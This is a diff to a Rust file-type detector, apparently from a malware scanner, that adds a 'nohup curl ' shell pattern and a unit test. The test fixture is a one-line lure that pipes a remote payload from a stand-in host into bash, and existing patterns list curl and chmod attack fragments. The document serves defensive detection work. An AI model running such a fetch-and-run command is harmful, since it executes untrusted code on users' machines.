@@ -128,6 +128,10 @@ const PATTERNS: &[(&[u8], Lang, u8)] = &[
     (b"; then\n", Lang::Shell, 5),
     (b"; do\n", Lang::Shell, 5),
     (b" && curl ", Lang::Shell, 10),
+    // Extensionless one-liners (`nohup curl -s https://… | bash`) carry no
+    // shebang and no shell extension, so they used to stay Unknown and every
+    // shell rule missed them. `nohup curl ` is a command sequence, not prose.
+    (b"nohup curl ", Lang::Shell, 10),
     (b" && chmod +x ", Lang::Shell, 10),
     (b"cd $", Lang::Shell, 5),
     (b"curl -O http", Lang::Shell, 5),
@@ -1126,6 +1130,14 @@ end tell\n";
         // the pacman hook-function definitions must classify as Shell even with
         // an unmapped `.install` extension so install-hook composites can fire.
         let data = b"post_install() {\n  cd /tmp\n  npm install atomic-lockfile yargs\n}\n";
+        assert_eq!(detect_from_content(data), Some(FileType::Shell));
+    }
+
+    #[test]
+    fn nohup_curl_pipe_bash_is_shell() {
+        // Disk-image lures named `Drag into Terminal.xyz` are a one-line
+        // shell with no shebang and a non-shell extension.
+        let data = b"nohup curl -s https://example.pages.dev/payload.aspx | bash\n";
         assert_eq!(detect_from_content(data), Some(FileType::Shell));
     }
 
